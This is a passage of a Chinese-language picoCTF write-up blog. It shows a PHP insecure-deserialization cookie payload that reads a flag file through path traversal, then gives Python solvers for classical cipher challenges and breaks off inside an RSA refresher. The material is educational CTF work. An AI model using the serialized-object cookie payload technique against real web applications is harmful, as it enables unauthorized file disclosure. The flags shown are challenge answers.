一個 access_log 的 class，並且把他的<code>$log_file</code>設定為<code>&quot;../flag&quot;</code>就可以了！Exploit 如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">access_log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log_file</span> = <span class="string">&quot;../flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">access_log</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面這個代碼執行後會得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>這個就是我們最終的 Payload 啦，把它貼到<code>login</code>的 cookie 的 value，並重新整理頁面試試看吧。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png" alt="Pwned!"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code-Analysis">Java Code Analysis!?!</h2><p>這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號<code>user</code>，密碼<code>user</code>。除此之外，也有給源代碼。我們先來看看網頁的樣子。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png" alt="Login"></p><p>登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png" alt="Home page"></p><p>題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。</p><p><strong>// TODO</strong></p><h1 id="Crypto">Crypto</h1><ul><li><a href="https://github.com/CX330Blake/Crypto_Notebook">My scripts &amp; note on Github</a></li><li><a href="https://cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notebook 密碼學任督二脈</a></li></ul><h2 id="Easy1">Easy1</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">   +----------------------------------------------------</span><br><span class="line">A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</span><br><span class="line">C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</span><br><span class="line">D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</span><br><span class="line">E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</span><br><span class="line">F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</span><br><span class="line">G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</span><br><span class="line">H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</span><br><span class="line">I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</span><br><span class="line">J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</span><br><span class="line">K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</span><br><span class="line">L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</span><br><span class="line">M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</span><br><span class="line">N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</span><br><span class="line">O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</span><br><span class="line">P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</span><br><span class="line">Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</span><br><span class="line">R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</span><br><span class="line">S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</span><br><span class="line">T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</span><br><span class="line">U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</span><br><span class="line">V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</span><br><span class="line">W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</span><br><span class="line">X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</span><br><span class="line">Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</span><br><span class="line">Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</span><br><span class="line"></span><br><span class="line">Cipher: UFJKXQZQUNB</span><br><span class="line">Key: SOLVECRYPTO</span><br></pre></td></tr></table></figure><p>這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。<a href="https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81">維基百科</a><br>解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;UFJKXQZQUNB&quot;</span></span><br><span class="line">key = <span class="string">&quot;SOLVECRYPTO&quot;</span></span><br><span class="line"></span><br><span class="line">pt = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    shift = <span class="built_in">ord</span>(key[i]) - <span class="number">65</span>  <span class="comment"># 獲取密鑰字母的偏移量</span></span><br><span class="line">    c = <span class="built_in">ord</span>(cipher[i])  <span class="comment"># 獲取密文當中目前的字母</span></span><br><span class="line"></span><br><span class="line">    c = (c - shift - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>  <span class="comment"># 用偏移量進行解密</span></span><br><span class="line">    pt += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message: <span class="subst">&#123;pt&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>而最後的 flag 如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CRYPTOISFUN&#125;</span><br></pre></td></tr></table></figure><h2 id="Caesar">Caesar</h2><p>如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的 flag</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;gvswwmrkxlivyfmgsrhnrisegl&#125;</span><br></pre></td></tr></table></figure><p>就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;gvswwmrkxlivyfmgsrhnrisegl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">        plaintext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="number">97</span> + shift) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    plaintext = caesar_cipher(cipher, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shift <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>跑出來的結果中，看起來是<code>crossingtherubicondjneoach</code>最合理，所以這就是 flag 了</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;crossingtherubicondjneoach&#125;</span><br></pre></td></tr></table></figure><h2 id="New-Caesar">New Caesar</h2><p>題目給了一個密文和一個 Python 腳本。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]</span><br><span class="line">enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line"><span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line"><span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;redacted&quot;</span></span><br><span class="line">key = <span class="string">&quot;redacted&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([k <span class="keyword">in</span> ALPHABET <span class="keyword">for</span> k <span class="keyword">in</span> key])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">b16 = b16_encode(flag)</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(b16):</span><br><span class="line">enc += shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後每 4 位元分為一塊，每塊的二進制數字（0 ～ 15）映射到 Base16 的字符集（a ～ p）。再把這個東西拿去做 shift，就是凱薩加密的變形。</p><p>總之解密的話就是反著來，就不詳細解釋了。Exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">        binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]  <span class="comment"># Since 4 bits can represent 16 characters</span></span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_decode</span>(<span class="params">b16</span>):</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b16), <span class="number">2</span>):</span><br><span class="line">        first = b16[c]</span><br><span class="line">        second = b16[c + <span class="number">1</span>]</span><br><span class="line">        first_index = ALPHABET.index(first)</span><br><span class="line">        second_index = ALPHABET.index(second)</span><br><span class="line">        binary = <span class="built_in">bin</span>(first_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>) + <span class="built_in">bin</span>(second_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">        dec += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET  <span class="comment"># (c - 97 + k - 97) % 16 = result</span></span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers sum modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 - t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers difference modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> ALPHABET:</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc):</span><br><span class="line">        dec += inverse_shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    b16_dec = b16_decode(dec)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted flag: <span class="subst">&#123;b16_dec&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>暴力破解後，看起來最像 Flag 的就是<code>et_tu?_23217b54456fb10e908b5e87c6e89156</code>這個了。最後自己幫它包上<code>picoCTF&#123;&#125;</code>提交，果然是正確的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;et_tu?_23217b54456fb10e908b5e87c6e89156&#125;</span><br></pre></td></tr></table></figure><h2 id="rotation">rotation</h2><p>這題給了一個加密後的密文。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xqkwKBN&#123;z0bib1wv_l3kzgxb3l_949in1i1&#125;</span><br></pre></td></tr></table></figure><p>看起來就是 Transposition Cipher，直接拿去網路上那種凱薩密碼暴力破解。這邊使用<a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706165309173.png" alt="Pwned!"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;r0tat1on_d3crypt3d_949af1a1&#125;</span><br></pre></td></tr></table></figure><h2 id="Mind-your-Ps-and-Qs">Mind your Ps and Qs</h2><p>這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Find two prime numbers </mtext><mi>p</mi><mtext> and </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">\text{Find two prime numbers } p \text{ and } q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">Find two prime numbers </span></span><span class="mord mathnormal">p</span><span class="mord text"><span class="mord"> and </span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n = p \times q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n) = (p-1) \times (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mtext> is the encryption exponent</mtext></mrow><annotation encoding="application/x-tex">e \text{ is the encryption exponent}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mord text"><span class="mord"> is the encryption exponent</span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d = e^{-1} \mod \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mtext> is the encrypted message</mtext><mo separator="true">;</mo><mspace width="1em"/><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c \text{ is the encrypted message}; \quad c = m^e \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">c</span><span class="mord text"><span class="mord"> is the encrypted message</span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mtext> is the message</mtext><mo separator="true">;</mo><mspace width="1em"/><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m \text{ is the message}; \quad m = c^d \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mord text"><span class="mord"> is the message</span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Public key</mtext><mo>=</mo><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Public key} = (e, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord 